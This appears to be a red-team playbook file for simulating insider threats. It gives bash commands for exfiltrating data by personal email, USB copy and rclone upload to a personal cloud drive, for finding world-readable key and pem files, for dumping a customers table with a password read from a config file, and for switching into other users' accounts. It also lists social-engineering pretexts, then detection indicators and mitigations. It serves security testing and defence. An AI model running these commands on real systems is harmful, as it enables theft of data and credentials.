---
name: insider-simulation
description: Legitimate access abuse, data exfiltration via authorized channels.
---

# Insider Threat Simulation

## 1. Scenario Types

| Type | Description | Risk Level |
|------|-------------|------------|
| Malicious Insider | Intentional data theft/sabotage | Critical |
| Negligent Insider | Accidental data exposure | High |
| Compromised Insider | Account/device takeover | High |
| Third-Party Insider | Vendor/contractor abuse | Medium |

## 2. Data Exfiltration via Authorized Access

### Email Exfiltration
```bash
# Send data to personal email using corporate account
# (Simulated - uses test data)
echo "Simulated sensitive data" | mail -s "Report" personal@email.com
```

### USB/Removable Media
```bash
# Copy data to USB (simulated)
cp /data/sensitive.xlsx /mnt/usb/
# Eject cleanly
umount /mnt/usb
```

### Cloud Storage (Authorized)
```bash
# Use approved cloud storage with excessive upload
rclone copy /data/project_files gdrive:personal-backup --transfers 4
```

### Print/Screen Capture
```bash
# Screenshot sensitive data
import -window root screenshot.png
# Convert to text
tesseract screenshot.png output
```

## 3. Privilege Abuse

### Excessive Permission Exploitation
```bash
# Find world-readable sensitive files
find / -perm -o=r -name "*.conf" -o -name "*.key" -o -name "*.pem" 2>/dev/null
# Access databases with shared credentials
mysql -u admin -p$(cat /etc/app/db.conf | grep password) -e "SELECT * FROM customers"
```

### Role Abuse
```bash
# Admin user accessing other accounts
su - target_user
# Using sudo unnecessarily
sudo -u oracle rman target /
```

## 4. Social Engineering (Internal)

### Pretexting
- Impersonate IT support requesting credentials
- Pose as new employee needing access
- Claim emergency requiring immediate data access

### Baiting
- Leave "found" USB drives with payloads
- Leave "confidential" documents in common areas

## 5. Detection Indicators

- Unusual data access patterns (time, volume, type)
- Access from unusual locations/IPs
- Excessive use of USB/removable media
- After-hours access to sensitive data
- Large downloads/uploads to personal accounts
- Access to files outside job function

## 6. Mitigations

- Data Loss Prevention (DLP) systems
- User Entity Behavior Analytics (UEBA)
- Least privilege access controls
- Regular access reviews
- Background checks
- Security awareness training
